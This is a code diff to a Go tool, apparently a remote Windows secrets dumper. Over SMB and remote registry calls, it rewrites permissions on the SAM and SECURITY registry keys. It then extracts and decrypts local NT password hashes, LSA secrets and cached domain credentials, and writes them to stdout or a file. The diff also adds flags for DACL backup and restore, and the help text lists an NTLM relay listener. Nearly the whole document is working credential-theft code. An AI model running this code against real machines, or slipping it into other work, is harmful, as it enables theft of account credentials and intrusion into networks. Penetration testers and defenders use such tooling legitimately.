@@ -22,9 +22,11 @@
 package main
 
 import (
+	"bufio"
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"io"
 	"math/rand"
 	"os"
 	"strings"
@@ -38,13 +40,70 @@ import (
 	"github.com/jfjallid/go-smb/smb"
 	"github.com/jfjallid/go-smb/smb/dcerpc"
 	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
+	"github.com/jfjallid/go-smb/smb/encoder"
 	"github.com/jfjallid/golog"
 )
 
 var log = golog.Get("")
-var release string = "0.2.0"
+var release string = "0.2.1"
 
 var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+// Local Administrators group SID
+var administratorsSID string = "S-1-5-32-544"
+
+// List of all registry keys changed with the order recorded
+var registryKeysModified []string
+
+// Map with all original security descriptors
+var m map[string]*msrrp.SecurityDescriptor
+
+var samSecretList = []printableSecret{}
+var lsaSecretList = []printableSecret{}
+var dcc2SecretList = []printableSecret{}
+
+var daclBackupFile *os.File
+var outputFile *os.File
+
+type printableSecret interface {
+	printSecret(io.Writer)
+}
+
+type sam_account struct {
+	name   string
+	rid    uint32
+	nthash string
+}
+
+func (self *sam_account) printSecret(out io.Writer) {
+	if outputFile != nil {
+		fmt.Fprintf(out, "%s:%d:%s\n", self.name, self.rid, self.nthash)
+	} else {
+		fmt.Fprintf(out, "Name: %s\n", self.name)
+		fmt.Fprintf(out, "RID: %d\n", self.rid)
+		fmt.Fprintf(out, "NT: %s\n\n", self.nthash)
+	}
+}
+
+type dcc2_cache struct {
+	domain string
+	user   string
+	cache  string
+}
+
+func (self *dcc2_cache) printSecret(out io.Writer) {
+	fmt.Fprintln(out, self.cache)
+}
+
+func (self *printableLSASecret) printSecret(out io.Writer) {
+	fmt.Fprintln(out, self.secretType)
+	for _, item := range self.secrets {
+		fmt.Fprintln(out, item)
+	}
+	if self.extraSecret != "" {
+		fmt.Fprintln(out, self.extraSecret)
+	}
+}
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
@@ -159,7 +218,7 @@ func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (er
 	return
 }
 
-func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string, m map[string]*msrrp.SecurityDescriptor) (map[string]*msrrp.SecurityDescriptor, error) {
+func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) error {
 	if m == nil {
 		m = make(map[string]*msrrp.SecurityDescriptor)
 	}
@@ -172,19 +231,50 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string, m 
 				continue
 			}
 			log.Errorln(err)
-			return nil, err
+			return err
 		}
 		//Retrieving security settings
 		sd, err := rpccon.GetKeySecurity(hSubKey)
 		if err != nil {
 			rpccon.CloseKeyHandle(hSubKey)
 			log.Errorln(err)
-			return nil, err
+			return err
+		}
+		sdBytes, err := sd.MarshalBinary(nil)
+		if err != nil {
+			log.Errorln(err)
+			return err
+		}
+
+		sd2 := msrrp.SecurityDescriptor{
+			OwnerSid: &msrrp.SID{},
+			GroupSid: &msrrp.SID{},
+			Sacl:     &msrrp.PACL{},
+			Dacl:     &msrrp.PACL{},
+		}
+		err = sd2.UnmarshalBinary(sdBytes, nil)
+		if err != nil {
+			log.Errorln(err)
+			return err
 		}
 		// Check if key exists before adding to map.
 		// Don't want to replace an existing key in case I change the ACL twice
 		if _, ok := m[subkey]; !ok {
 			m[subkey] = sd
+			if daclBackupFile != nil {
+				// Save new SD file
+				sdBytes, err := encoder.Marshal(sd)
+				if err != nil {
+					log.Errorf("Failed to marshal SecurityDescriptor to bytes with error: %s\n", err)
+				} else {
+					sdHexBytes := hex.EncodeToString(sdBytes)
+					_, err = daclBackupFile.WriteString(fmt.Sprintf("%s:%s\n", subkey, sdHexBytes))
+					if err != nil {
+						log.Errorf("Failed to write DACL to file with error: %s\n", err)
+					}
+				}
+			}
+
 		}
 
 		mask := msrrp.PermWriteDacl | msrrp.PermReadControl | msrrp.PermKeyEnumerateSubKeys | msrrp.PermKeyQueryValue
@@ -193,36 +283,45 @@ func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string, m 
 			rpccon.CloseKeyHandle(hSubKey)
 			delete(m, subkey)
 			log.Errorln(err)
-			return nil, err
+			return err
 		}
 		// NOTE Can't set owner, group or SACL, since I only have WriteDacl on SAM\SAM
 		newSd, err := msrrp.NewSecurityDescriptor(sd.Control, nil, nil, msrrp.NewACL(append([]msrrp.ACE{*ace}, sd.Dacl.ACLS...)), nil)
 
+		log.Infof("Changing Dacl for key: %s\n", subkey)
 		err = rpccon.SetKeySecurity(hSubKey, newSd)
 		if err != nil {
 			rpccon.CloseKeyHandle(hSubKey)
 			delete(m, subkey)
 			log.Errorln(err)
-			return nil, err
+			return err
 		}
 		rpccon.CloseKeyHandle(hSubKey)
 	}
-	return m, nil
+	return nil
 }
 
-func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
+func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
+	if m == nil {
+		err := fmt.Errorf("The map variable 'm' is not initialized which would indicate that no DACL was changed yet")
+		log.Errorln(err)
+		return err
+	}
+
 	var sd *msrrp.SecurityDescriptor
 	var ok bool
 	for _, subkey := range keys {
 		if sd, ok = m[subkey]; !ok {
+			log.Debugf("Trying to restore DACL of registry key %s, but the original DACL hasn't been saved.\nIt is likely that the registry key doesn't even exist\n", subkey)
 			// Key did not exist so was not added to map
 			continue
 		}
 		hSubKey, err := rpccon.OpenSubKey(base, subkey)
 		if err != nil {
-			log.Errorln(err)
+			log.Errorf("Tried to restore DACL of registry key %s, but failed to open registry key with error: %s\n", err)
 			continue // Try to change as many keys as possible
 		}
+
 		sd.Control &^= msrrp.SecurityDescriptorFlagSP
 		sd.OffsetSacl = 0
 		sd.OwnerSid = nil
@@ -236,22 +335,273 @@ func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, m map[string]*
 			rpccon.CloseKeyHandle(hSubKey)
 			continue
 		}
+		log.Infof("Reverted Dacl for key: %s\n", subkey)
 		rpccon.CloseKeyHandle(hSubKey)
 	}
 	return nil
 }
 
-func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
+func restoreDaclFromBackup(rpccon *msrrp.RPCCon, hKey []byte) error {
+	daclMap := make(map[string]*msrrp.SecurityDescriptor)
+	keys := []string{}
+
+	if daclBackupFile == nil {
+		err := fmt.Errorf("Something went wrong with restoring DACLs from file. Backup file handle is nil")
+		log.Errorln(err)
+		return err
+	}
+	scanner := bufio.NewScanner(daclBackupFile)
+	for scanner.Scan() {
+		sd := msrrp.SecurityDescriptor{
+			OwnerSid: &msrrp.SID{},
+			GroupSid: &msrrp.SID{},
+			Sacl:     &msrrp.PACL{},
+			Dacl:     &msrrp.PACL{},
+		}
+		line := scanner.Text()
+		parts := strings.Split(line, ":")
+		if len(parts) != 2 {
+			err := fmt.Errorf("Expected lines to be of the format 'regkey:hexstring', but failed to parse string")
+			log.Errorln(err)
+			return err
+		}
+		sdBytes, err := hex.DecodeString(parts[1])
+		if err != nil {
+			log.Errorf("Failed to hex decode security descriptor bytes with error: %s\n", err)
+			return err
+		}
+		err = sd.UnmarshalBinary(sdBytes, nil)
+		if err != nil {
+			log.Errorf("Failed to unmarshal security descriptor bytes with error: %s\n", err)
+			return err
+		}
+		daclMap[parts[0]] = &sd
+		keys = append(keys, parts[0])
+	}
+	if err := scanner.Err(); err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	m = daclMap
+
+	return tryRollbackChanges(rpccon, hKey, keys)
+}
+
+func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string) error {
 	log.Infoln("Attempting to restore security descriptors")
 	// Rollback changes in reverse order
 	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
 		keys[i], keys[j] = keys[j], keys[i]
 	}
-	err := revertDacl(rpccon, hKey, keys, m)
+	err := revertDacl(rpccon, hKey, keys)
 	if err != nil {
 		log.Errorln(err)
 		return err
 	}
+	return nil
+}
+
+func addToListIfNotExit(list *[]string, keys []string) []string {
+	newKeys := []string{}
+OuterLoop:
+	for _, key := range keys {
+		for _, k := range *list {
+			if key == k {
+				continue OuterLoop
+			}
+		}
+		// Key was not already added to the list
+		newKeys = append(newKeys, key)
+	}
+	// Add only if they do not already exist
+	*list = append(*list, newKeys...)
+	return newKeys
+}
+
+func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {
+
+	keys := []string{
+		`SAM\SAM`,
+		`SAM\SAM\Domains`,
+		`SAM\SAM\Domains\Account`,
+		`SAM\SAM\Domains\Account\Users`,
+	}
+	registryKeysModified = append(registryKeysModified, keys...)
+	// Grant temporarily higher permissions to the local administrators group
+	err := changeDacl(rpccon, hKey, keys, administratorsSID)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	// Get RIDs of local users
+	keyUsers := `SAM\SAM\Domains\Account\Users`
+	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	rids = rids[:len(rids)-1]
+	for i := range rids {
+		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
+	}
+
+	// Extend the list of keys that have temporarily altered permissions
+	registryKeysModified = append(registryKeysModified, rids...)
+	// Grant temporarily higher permissions to the local administrators group
+	err = changeDacl(rpccon, hKey, rids, administratorsSID)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	syskey, err := getSysKey(rpccon, hKey)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	// Gather credentials/secrets
+	creds, err := getNTHash(rpccon, hKey, rids)
+	if err != nil {
+		log.Errorln(err)
+		// Try to get other secrets instead of hard fail
+	} else {
+		//TODO Rewrite handling of creds to not print to stdout until the end
+		// Would be nice to be able to choose writing output to file, or somewhere else
+		for _, cred := range creds {
+			acc := sam_account{name: cred.Username, rid: cred.RID}
+			//fmt.Printf("Name: %s\n", cred.Username)
+			//fmt.Printf("RID: %d\n", cred.RID)
+			if len(cred.Data) == 0 {
+				//fmt.Printf("NT: <empty>\n\n")
+				acc.nthash = "<empty>"
+				samSecretList = append(samSecretList, &acc)
+				continue
+			}
+			var hash []byte
+			if cred.AES {
+				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
+			} else {
+				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
+			}
+			acc.nthash = fmt.Sprintf("%x", hash)
+			samSecretList = append(samSecretList, &acc)
+			//fmt.Printf("NT: %x\n\n", hash)
+		}
+	}
+
+	return nil
+}
+
+func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte) error {
+	keys := []string{
+		`SECURITY\Policy\Secrets`,
+		`SECURITY\Policy\Secrets\NL$KM`,
+		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
+		`SECURITY\Policy\PolEKList`,
+		`SECURITY\Policy\PolSecretEncryptionKey`,
+	}
+	registryKeysModified = append(registryKeysModified, keys...)
+
+	// Grant temporarily higher permissions to the local administrators group
+	err := changeDacl(rpccon, hKey, keys, administratorsSID)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	// Get names of lsa secrets
+	keySecrets := `SECURITY\Policy\Secrets`
+	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	newSecrets := make([]string, 0, len(secrets)*2)
+	for i := range secrets {
+		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
+		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
+	}
+
+	newKeys := addToListIfNotExit(&registryKeysModified, newSecrets)
+	err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
+	if err != nil {
+		log.Noticeln("Failed to get lsa secrets")
+		log.Errorln(err)
+		return err
+	}
+	for i := range lsaSecrets {
+		lsaSecretList = append(lsaSecretList, &lsaSecrets[i])
+	}
+
+	//if len(lsaSecrets) > 0 {
+	//	fmt.Println("[*] LSA Secrets:")
+	//	for _, secret := range lsaSecrets {
+	//		fmt.Println(secret.secretType)
+	//		for _, item := range secret.secrets {
+	//			fmt.Println(item)
+	//		}
+	//		if secret.extraSecret != "" {
+	//			fmt.Println(secret.extraSecret)
+	//		}
+	//	}
+	//}
+
+	return nil
+}
+
+func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte) error {
+	keys := []string{
+		`SECURITY\Policy\Secrets`,
+		`SECURITY\Policy\Secrets\NL$KM`,
+		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
+		`SECURITY\Policy\PolEKList`,
+		`SECURITY\Policy\PolSecretEncryptionKey`,
+		`SECURITY\Cache`,
+	}
+	newKeys := addToListIfNotExit(&registryKeysModified, keys)
+	// Grant temporarily higher permissions to the local administrators group
+	err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	cachedHashes, err := GetCachedHashes(rpccon, hKey)
+	if err != nil {
+		log.Errorln(err)
+		return err
+	}
+
+	for _, hash := range cachedHashes {
+		userdomain := strings.Split(hash, ":")[0]
+		parts := strings.Split(userdomain, "/")
+		dcc2SecretList = append(dcc2SecretList, &dcc2_cache{domain: parts[0], user: parts[1], cache: hash})
+	}
+
+	//if len(cachedHashes) > 0 {
+	//	//fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
+	//	for _, secret := range cachedHashes {
+	//        userdomain := strings.Split(secret, ":")[0]
+	//        parts := strings.Split(userdomain, "/")
+	//        _ = dcc2_cache{
+	//            domain: parts[0],
+	//            user: parts[1],
+	//            cache: secret,
+	//        }
+	//	}
+	//}
+
 	return nil
 }
 
@@ -361,183 +711,6 @@ func dumpOffline(session *smb.Connection, rpccon *msrrp.RPCCon, hKey []byte, dst
 	return nil
 }
 
-func dumpOnline(rpccon *msrrp.RPCCon, hKey []byte) error {
-	log.Noticeln("Performing an online dump of secrets from the registry")
-	// Most of the registry keys needed for extracting secrets from the registry.
-	// The local group "administrators" has WriteDACL on HKLM:\\SAM\SAM so that
-	// SID is used for the temporary increase in privileges.
-	// Note that this list is extended with dynamically discovered SIDs for
-	// local users.
-	sid := "S-1-5-32-544"
-	keys := []string{
-		`SAM\SAM`,
-		`SAM\SAM\Domains`,
-		`SAM\SAM\Domains\Account`,
-		`SAM\SAM\Domains\Account\Users`,
-		`SECURITY\Policy\Secrets`,
-		`SECURITY\Policy\Secrets\NL$KM`,
-		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
-		`SECURITY\Cache`,
-		`SECURITY\Policy\PolEKList`,
-		`SECURITY\Policy\PolSecretEncryptionKey`,
-	}
-
-	// Grant temporarily higher permissions to the local administrators group
-	m, err := changeDacl(rpccon, hKey, keys, sid, nil)
-	if err != nil {
-		log.Errorln(err)
-		return err
-	}
-
-	// Get RIDs of local users
-	keyUsers := `SAM\SAM\Domains\Account\Users`
-	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-	}
-
-	rids = rids[:len(rids)-1]
-	for i := range rids {
-		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
-	}
-
-	// Extend the list of keys that have temporarily altered permissions
-	keys = append(keys, rids...)
-	// Grant temporarily higher permissions to the local administrators group
-	m, err = changeDacl(rpccon, hKey, rids, sid, m)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-
-	syskey, err := getSysKey(rpccon, hKey)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-
-	// Gather credentials/secrets
-	creds, err := getNTHash(rpccon, hKey, rids)
-	if err != nil {
-		log.Errorln(err)
-		// Try to get other secrets instead of hard fail
-	} else {
-		for _, cred := range creds {
-			fmt.Printf("Name: %s\n", cred.Username)
-			fmt.Printf("RID: %d\n", cred.RID)
-			if len(cred.Data) == 0 {
-				fmt.Printf("NT: <empty>\n\n")
-				continue
-			}
-			var hash []byte
-			if cred.AES {
-				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
-			} else {
-				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
-			}
-			fmt.Printf("NT: %x\n\n", hash)
-		}
-	}
-
-	// Get names of lsa secrets
-	keySecrets := `SECURITY\Policy\Secrets`
-	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-	newSecrets := make([]string, 0, len(secrets)*2)
-	for i := range secrets {
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
-		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
-	}
-
-	keys = append(keys, newSecrets...)
-	m, err = changeDacl(rpccon, hKey, newSecrets, sid, m)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-
-	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
-	if err != nil {
-		log.Noticeln("Failed to get lsa secrets")
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-	if len(lsaSecrets) > 0 {
-		fmt.Println("[*] LSA Secrets:")
-		for _, secret := range lsaSecrets {
-			fmt.Println(secret.secretType)
-			for _, item := range secret.secrets {
-				fmt.Println(item)
-			}
-			if secret.extraSecret != "" {
-				fmt.Println(secret.extraSecret)
-			}
-		}
-	}
-
-	cachedHashes, err := GetCachedHashes(rpccon, hKey)
-	if err != nil {
-		log.Errorln(err)
-		err = tryRollbackChanges(rpccon, hKey, keys, m)
-		if err != nil {
-			log.Errorln(err)
-			return err
-		}
-		return err
-	}
-
-	if len(cachedHashes) > 0 {
-		fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
-		for _, secret := range cachedHashes {
-			fmt.Println(secret)
-		}
-	}
-
-	//Revert changes
-	err = tryRollbackChanges(rpccon, hKey, keys, m)
-	if err != nil {
-		log.Errorln(err)
-		return err
-	}
-
-	log.Infoln("Restored permissions on ACLs")
-
-	return nil
-}
-
 var helpMsg = `
     Usage: ` + os.Args[0] + ` [options]
 
@@ -552,6 +725,12 @@ var helpMsg = `
           --local               Authenticate as a local user instead of domain user
           --dump                Saves the SAM and SECURITY hives to disk and
                                 transfers them to the local machine.
+          --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
+          --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
+          --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
+          --backup-dacl         Save original DACLs to disk before modification
+          --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
+          --backup-file         Filename for DACL backup (default dacl.backup)
           --relay               Start an SMB listener that will relay incoming
                                 NTLM authentications to the remote server and
                                 use that connection. NOTE that this forces SMB 2.1
@@ -564,13 +743,14 @@ var helpMsg = `
           --smb2                Force smb 2.1
           --debug               Enable debug logging
           --verbose             Enable verbose logging
+      -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
       -v, --version             Show version
 `
 
 func main() {
-	var host, username, password, hash, domain, socksIP string
+	var host, username, password, hash, domain, socksIP, backupFilename, outputFilename string
 	var port, dialTimeout, socksPort, relayPort int
-	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass bool
+	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, backupDacl, restoreDacl bool
 	var err error
 
 	flag.Usage = func() {
@@ -604,6 +784,14 @@ func main() {
 	flag.IntVar(&socksPort, "socks-port", 1080, "")
 	flag.BoolVar(&noPass, "no-pass", false, "")
 	flag.BoolVar(&noPass, "n", false, "")
+	flag.BoolVar(&sam, "sam", false, "")
+	flag.BoolVar(&lsaSecrets, "lsa", false, "")
+	flag.BoolVar(&dcc2, "dcc2", false, "")
+	flag.BoolVar(&backupDacl, "backup-dacl", false, "")
+	flag.BoolVar(&restoreDacl, "restore-dacl", false, "")
+	flag.StringVar(&backupFilename, "backup-file", "dacl.backup", "")
+	flag.StringVar(&outputFilename, "o", "", "")
+	flag.StringVar(&outputFilename, "output", "", "")
 
 	flag.Parse()
 
@@ -637,6 +825,44 @@ func main() {
 			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
 		}
 		return
+	}
+
+	if !sam && !lsaSecrets && !dcc2 {
+		// If no individual target to dump is set, dump everything
+		sam = true
+		lsaSecrets = true
+		dcc2 = true
+	}
+
+	if backupDacl && restoreDacl {
+		log.Errorln("Can't specify both --backup-dacl and --restore-dacl at the same time.")
+		flag.Usage()
+		return
+	}
+
+	if backupDacl {
+		daclBackupFile, err = os.OpenFile(backupFilename, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0600)
+		if err != nil {
+			log.Errorf("Failed to create local file %s to store original DACLs before modification with error: %s\n", backupFilename, err)
+			return
+		}
+		defer daclBackupFile.Close()
+	} else if restoreDacl {
+		daclBackupFile, err = os.Open(backupFilename)
+		if err != nil {
+			log.Errorf("Failed to open local file %s to read original DACLs before restoring the ACLs with error: %s\n", backupFilename, err)
+			return
+		}
+		defer daclBackupFile.Close()
+	}
+
+	if outputFilename != "" {
+		outputFile, err = os.OpenFile(outputFilename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0600)
+		if err != nil {
+			log.Errorf("Failed to open local file %s for writing results with error: %s\n", outputFilename, err)
+			return
+		}
+		defer outputFile.Close()
 	}
 
 	share := ""
@@ -761,7 +987,10 @@ func main() {
 
 	defer func() {
 		if !registryStarted {
-			stopRemoteRegistry(session, share, registryDisabled)
+			err = stopRemoteRegistry(session, share, registryDisabled)
+			if err != nil {
+				log.Errorf("Failed to restore status of RemoteRegistry service with error: %s\n", err)
+			}
 		}
 	}()
 
@@ -791,13 +1020,71 @@ func main() {
 	}
 	defer rpccon.CloseKeyHandle(hKey)
 
-	if dump {
-		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
-	} else {
-		err = dumpOnline(rpccon, hKey)
-	}
-	if err != nil {
-		log.Errorln(err)
+	if restoreDacl {
+		restoreDaclFromBackup(rpccon, hKey)
+		return
 	}
 
+	if dump {
+		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+	} else {
+		defer func() {
+			// If calling defer on tryRollbackChanges directly, all the arguments
+			// will be locked to their current values at time of calling defer
+			tryRollbackChanges(rpccon, hKey, registryKeysModified)
+		}()
+
+		if sam {
+			err = dumpSAM(rpccon, hKey)
+			if err != nil {
+				log.Errorln(err)
+				return
+			}
+		}
+		if lsaSecrets {
+			err = dumpLSASecrets(rpccon, hKey)
+			if err != nil {
+				log.Errorln(err)
+				return
+			}
+		}
+		if dcc2 {
+			err = dumpDCC2Cache(rpccon, hKey)
+			if err != nil {
+				log.Errorln(err)
+				return
+			}
+		}
+
+		// Print results
+		var out io.Writer
+		if outputFile != nil {
+			out = outputFile
+		} else {
+			out = os.Stdout
+		}
+		//TODO Write name of host?
+		if len(samSecretList) > 0 {
+			fmt.Fprintln(out, "[*] Dumping local SAM hashes")
+			for i := range samSecretList {
+				samSecretList[i].printSecret(out)
+			}
+		}
+		if len(lsaSecretList) > 0 {
+			fmt.Fprintln(out, "[*] Dumping LSA Secrets")
+			for i := range lsaSecretList {
+				lsaSecretList[i].printSecret(out)
+			}
+		}
+		if len(dcc2SecretList) > 0 {
+			fmt.Fprintln(out, "[*] Dumping cached domain credentials (domain/username:hash)")
+			for i := range dcc2SecretList {
+				dcc2SecretList[i].printSecret(out)
+			}
+		}
+	}
 }
